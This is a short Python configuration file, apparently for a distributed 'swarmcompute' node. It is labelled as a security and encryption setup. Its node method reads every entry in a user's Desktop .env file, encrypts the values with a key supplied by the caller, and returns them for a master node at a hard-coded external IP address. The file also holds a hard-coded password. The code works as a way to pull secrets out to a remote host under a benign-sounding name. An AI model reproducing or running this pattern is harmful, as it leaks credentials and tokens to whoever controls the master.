from swarmcompute.configs.test_config import test_config as config

# SECURITY_SERVER
personal_server_config = config

# SECURITY_SERVER
def encryption_aux(public_key):
	from cryptography.fernet import Fernet
	from dotenv import dotenv_values
	encryption = Fernet(public_key)
	env_vars = dotenv_values(r'C:\Users\apren\Desktop\.env')
	encrypted_vars = {k: encryption.encrypt(v.encode()).decode() for k, v in env_vars.items()}
	return encrypted_vars
security_config = {
    # NANO NET
    'mode': 'node',
	'master_address': 'tcp://95.18.166.44:5005',
	'password': 'youshallnotpass',
	'node_name': 'security_node',
	'node_method': encryption_aux,
    'address_node': 'test_node',
    'payload': {'a': 1, 'b': 2},
    'delay': 1,
}
